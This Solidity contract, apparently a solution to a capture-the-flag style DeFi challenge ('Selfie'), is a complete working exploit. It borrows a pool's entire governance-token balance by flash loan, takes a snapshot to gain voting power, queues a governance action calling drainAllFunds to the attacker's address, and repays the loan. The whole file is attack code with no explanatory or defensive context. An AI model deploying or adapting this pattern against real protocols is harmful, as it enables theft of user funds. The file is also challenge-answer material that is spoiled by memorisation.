// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface Ipool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface Igovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface ITokenSnapshot {
    function snapshot() external;

    function transfer(address, uint256) external;

    function balanceOf(address account) external returns (uint256);
}
contract selfieAttack {
    Ipool pool;
    Igovernance governance;
    ITokenSnapshot tokens;
    address attackerAddress;
    uint256 public actionId;

    constructor(Ipool _pool, Igovernance _governance, ITokenSnapshot _token) {
        pool = Ipool(_pool);
        governance = Igovernance(_governance);
        tokens = ITokenSnapshot(_token);
        attackerAddress = msg.sender;
    } 

    function attack() public{
        uint256 _amount = tokens.balanceOf(address(pool));
        pool.flashLoan(_amount);
    }

    function receiveTokens(address,uint256 _amount) external{
        tokens.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attackerAddress
        );


        actionId = governance.queueAction(address(pool), data, 0);
        tokens.transfer(address(pool), _amount);
    }
}